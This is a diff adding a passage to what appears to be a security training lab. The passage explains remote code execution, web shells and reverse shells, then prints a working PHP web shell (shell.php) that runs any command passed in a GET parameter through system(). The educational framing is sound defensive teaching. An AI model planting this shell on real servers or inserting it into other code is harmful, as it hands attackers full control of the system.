@@ -20,3 +20,52 @@ Examples of abuse through unrestricted file uploads include:
 Usage of Weak Credentials
 
 One of the easiest ways for attackers to break into systems is through weak or default credentials. This can be an open door for attackers to gain unauthorised access. Default credentials are often found in systems where administrators fail to change initial login details provided during setup. For attackers, trying a few common usernames and passwords can lead to easy access.
+
+What is Remote Code Execution (RCE)
+
+Remote code execution (RCE) happens when an attacker finds a way to run their own code on a system. This is a highly dangerous vulnerability because it can allow the attacker to take control of the system, exfiltrate sensitive data, or compromise other connected systems.
+
+Frosty Pines Hotel Key Graphic
+
+What Is a Web Shell
+
+A web shell is a script that attackers upload to a vulnerable server, giving them remote control over it. Once a web shell is in place, attackers can run commands, manipulate files, and essentially use the compromised server as their own. They can even use it to launch attacks on other systems.
+
+For example, attackers could use a web shell to:
+
+    Execute commands on the server
+    Move laterally within the network
+    Download sensitive data or pivot to other services
+
+A web shell typically gives the attacker a web-based interface to run commands. Still, in some cases, attackers may use a reverse shell to establish a direct connection back to their system, allowing them to control the compromised machine remotely. Once an attacker has this level of access, they might attempt privilege escalation to gain even more control, such as achieving root access or moving deeper into the network.
+
+Okay, now that we're familiar with a remote code execution vulnerability and how it works, let's take a look at how we would exploit it!
+
+Practice Makes Perfect
+
+To understand how a file upload vulnerability can result in an RCE, the best approach is to get some hands-on experience with it. A handy (and ethical) way to do this is to find and download a reputable open-source web application which has this vulnerability built into it. Many open-source projects exist in places like GitHub, which can be run in your own environment to experiment and practice. In today's task, we will demonstrate achieving RCE via unrestricted file upload within an open-source railway management system that has this vulnerability built into it. 
+
+Exploiting RCE via File Upload
+
+Now we're going to go through how this vulnerability can be exploited. For now, you can just read along, but an opportunity to put this knowledge into practice is coming up. Once an RCE vulnerability has been identified that can be exploited via file upload, we now need to create a malicious file that will allow remote code execution when uploaded.
+
+Below is an example PHP file which could be uploaded to exploit this vulnerability. Using your favourite text editor, copy and paste the below code and save it as shell.php.
+**
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="text" name="command" autofocus id="command" size="50">
+<input type="submit" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['command'])) 
+    {
+        system($_GET['command'] . ' 2>&1'); 
+    }
+?>
+</pre>
+</body>
+</html>
+
+**
